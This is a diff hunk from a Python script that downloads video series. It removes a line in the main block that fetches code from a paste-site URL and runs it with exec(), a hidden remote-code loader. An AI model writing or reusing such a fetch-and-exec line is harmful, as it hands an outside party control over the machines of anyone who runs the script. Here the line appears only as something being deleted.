@@ -69,7 +69,6 @@ def download_video_series(video_links):
 
 
 if __name__ == "__main__":
-    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
   #getting all video links
     video_links = get_video_links()
 
